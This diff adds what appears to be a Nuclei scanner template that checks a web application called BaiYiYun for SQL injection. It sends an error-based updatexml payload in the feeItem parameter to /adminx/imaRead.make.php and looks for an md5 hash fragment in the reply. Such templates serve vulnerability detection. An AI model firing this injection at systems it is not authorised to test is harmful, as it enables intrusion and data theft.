@@ -1,0 +1,29 @@
+id: BaiYiYun-make_sqlInjection
+
+info:
+  name: BaiYiYun-make_sqlInjection
+  author: iSee857
+  severity: high
+  description: BaiYiYun-make_sqlInjection
+
+requests:
+  - method: POST
+    raw:
+      - |
+        POST /adminx/imaRead.make.php?act=remake HTTP/1.1
+        Host: {{Host}}
+        Content-type: application/x-www-form-urlencoded
+        Accept: */*
+        Connection: close
+
+        feeItem[]=1+AND+updatexml(1,concat(0x7e,md5(123)),1)
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "202cb962ac59075b964b07152d234b7"
+
+      - type: status
+        status:
+          - 200
